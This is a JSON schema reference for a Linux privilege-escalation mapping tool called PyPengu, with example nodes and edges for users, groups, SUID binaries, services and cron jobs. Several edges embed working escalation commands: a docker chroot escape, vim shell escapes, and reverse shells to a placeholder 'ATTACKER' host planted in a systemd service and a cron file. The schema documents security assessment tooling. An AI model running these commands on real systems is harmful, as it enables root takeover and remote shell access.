# PyPengu JSON Schema

## Structure

```json
{
  "metadata": { ... },
  "nodes": [ ... ],
  "edges": [ ... ],
  "stats": { ... }
}
```

## Metadata

```json
{
  "hostname": "server-01",
  "ip": "192.168.1.100",
  "os": "Ubuntu 22.04",
  "kernel": "5.15.0-91-generic",
  "arch": "x86_64",
  "collected_at": "2024-02-13T10:30:00Z",
  "collector": "pypengu",
  "collector_version": "1.0.0",
  "collected_as": "www-data",
  "uid": "33"
}
```

## Node Types

### User
```json
{
  "id": "user:www-data",
  "type": "user",
  "label": "www-data",
  "properties": {
    "uid": "33",
    "shell": "/bin/bash",
    "is_current": true,
    "is_root": false
  }
}
```

### Group
```json
{
  "id": "group:docker",
  "type": "group",
  "label": "docker",
  "properties": {
    "gid": "999",
    "is_privileged": true
  }
}
```

### Binary (SUID)
```json
{
  "id": "binary:/usr/bin/vim",
  "type": "binary",
  "label": "vim",
  "properties": {
    "path": "/usr/bin/vim",
    "owner": "root",
    "suid": true,
    "gtfobin": true,
    "gtfobin_url": "https://gtfobins.github.io/gtfobins/vim/"
  }
}
```

### Service
```json
{
  "id": "service:backup",
  "type": "service",
  "label": "backup.service",
  "properties": {
    "path": "/etc/systemd/system/backup.service",
    "run_as": "root",
    "state": "enabled"
  }
}
```

### Cron
```json
{
  "id": "cron:cleanup",
  "type": "cron",
  "label": "cleanup",
  "properties": {
    "path": "/etc/cron.d/cleanup",
    "schedule": "*/5 * * * *",
    "run_as": "root"
  }
}
```

## Edge Types

### MemberOf
```json
{
  "id": "edge:001",
  "source": "user:www-data",
  "target": "group:docker",
  "type": "MemberOf",
  "risk": "medium",
  "properties": {}
}
```

### DockerAccess
```json
{
  "id": "edge:002",
  "source": "group:docker",
  "target": "user:root",
  "type": "DockerAccess",
  "risk": "critical",
  "properties": {
    "socket": "/var/run/docker.sock",
    "exploit_snippet": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
  }
}
```

### SudoAll / SudoNoPasswd / SudoCommand
```json
{
  "id": "edge:003",
  "source": "user:deploy",
  "target": "user:root",
  "type": "SudoCommand",
  "risk": "critical",
  "properties": {
    "command": "/usr/bin/vim",
    "nopasswd": true,
    "gtfobin": true,
    "gtfobin_url": "https://gtfobins.github.io/gtfobins/vim/",
    "exploit_snippet": "sudo vim -c ':!/bin/bash'",
    "entry": "deploy ALL=(ALL) NOPASSWD: /usr/bin/vim"
  }
}
```

### SuidBinary
```json
{
  "id": "edge:004",
  "source": "user:www-data",
  "target": "binary:/usr/bin/vim",
  "type": "SuidBinary",
  "risk": "high",
  "properties": {
    "path": "/usr/bin/vim",
    "gtfobin": true,
    "exploit_snippet": "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
    "gtfobin_url": "https://gtfobins.github.io/gtfobins/vim/"
  }
}
```

### WritableService
```json
{
  "id": "edge:005",
  "source": "user:www-data",
  "target": "service:backup",
  "type": "WritableService",
  "risk": "critical",
  "properties": {
    "path": "/etc/systemd/system/backup.service",
    "exploit_snippet": "echo '[Service]\\nExecStart=/bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1' > /etc/systemd/system/backup.service && systemctl daemon-reload"
  }
}
```

### WritableCron
```json
{
  "id": "edge:006",
  "source": "user:deploy",
  "target": "cron:cleanup",
  "type": "WritableCron",
  "risk": "high",
  "properties": {
    "path": "/etc/cron.d/cleanup",
    "schedule": "*/5 * * * *",
    "exploit_snippet": "echo '* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /etc/cron.d/cleanup"
  }
}
```

### KernelExploit
```json
{
  "id": "edge:007",
  "source": "user:www-data",
  "target": "user:root",
  "type": "KernelExploit",
  "risk": "high",
  "properties": {
    "kernel_version": "5.15.0-91-generic",
    "cve": "CVE-2023-0386",
    "description": "OverlayFS privilege escalation",
    "reference": "https://nvd.nist.gov/vuln/detail/CVE-2023-0386"
  }
}
```

## Risk Levels

- `critical` : Direct path to root
- `high` : Exploitable with known techniques
- `medium` : Requires chaining or conditions
- `low` : Informational

## Stats

```json
{
  "total_nodes": 15,
  "total_edges": 12,
  "paths_to_root": 5
}
```
